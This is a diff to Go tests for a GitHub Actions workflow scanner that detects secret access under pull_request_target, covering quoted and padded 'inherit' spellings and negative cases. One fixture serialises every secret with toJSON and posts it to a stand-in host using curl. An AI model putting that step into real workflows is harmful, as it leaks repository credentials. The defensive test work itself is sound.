@@ -160,13 +160,26 @@ func TestParseWorkflowNeverPanics(t *testing.T) {
 	}
 }
 
-// Regressions from the Codex review of #103: three ways a secret can be
-// reachable that a `secrets.` substring check alone would miss.
+// Regressions from the Codex review of #103, extended by #110: ways a
+// secret can be reachable that a substring check misses.
+//
+// The three `inherit` spellings are the point of the structural read. Each
+// one decodes to the same `jobs.a.secrets: inherit` mapping GitHub Actions
+// consumes — quoting a key and padding after a colon are insignificant to
+// YAML — while none but the first contains the literal text
+// "secrets: inherit". Measured before the fix: only the plain form scored.
 func TestParseWorkflowSecretSpellings(t *testing.T) {
 	tests := map[string]string{
-		"dot form":     "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets.TOKEN }}\n",
-		"index form":   "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets['DEPLOY_TOKEN'] }}\n",
-		"inherit form": "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n",
+		"dot form":              "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets.TOKEN }}\n",
+		"index form":            "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets['DEPLOY_TOKEN'] }}\n",
+		"inherit form":          "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n",
+		"inherit, quoted key":   "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    \"secrets\": inherit\n",
+		"inherit, single quote": "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    'secrets': inherit\n",
+		"inherit, padded":       "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets:    inherit\n",
+		// toJSON serialises every secret at once while naming none, so it
+		// contains neither "secrets." nor "secrets[".
+		"toJSON of the context": "on: pull_request_target\njobs:\n  a:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n    steps:\n      - run: curl -d \"$ALL\" https://x.invalid\n",
+		"bare context in expr":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo '${{ secrets }}'\n",
 	}
 	for name, y := range tests {
 		t.Run(name, func(t *testing.T) {
@@ -176,6 +189,27 @@ func TestParseWorkflowSecretSpellings(t *testing.T) {
 			}
 			if len(got.ForkTriggers) != 1 {
 				t.Errorf("fork trigger not detected: %+v", got.ForkTriggers)
+			}
+		})
+	}
+}
+
+// The other direction: the word appearing where it reaches nothing must
+// not score. Detection only looks inside `${{ … }}`, so prose and
+// similarly-named identifiers stay out — a false positive on this axis is
+// what teaches people to ignore it.
+func TestParseWorkflowSecretsWordWithoutAccess(t *testing.T) {
+	tests := map[string]string{
+		"in a comment":         "on: pull_request_target\n# no secrets are used here\njobs:\n  a:\n    steps:\n      - run: true\n",
+		"in a step name":       "on: pull_request_target\njobs:\n  a:\n    steps:\n      - name: check for secrets\n        run: true\n",
+		"a different context":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.event.number }}\n",
+		"similarly named var":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ env.mysecrets }}\n",
+		"across two expr ends": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.actor }} secrets ${{ github.sha }}\n",
+	}
+	for name, y := range tests {
+		t.Run(name, func(t *testing.T) {
+			if parseWorkflow([]byte(y)).UsesSecrets {
+				t.Errorf("%s scored as reaching secrets", name)
 			}
 		})
 	}
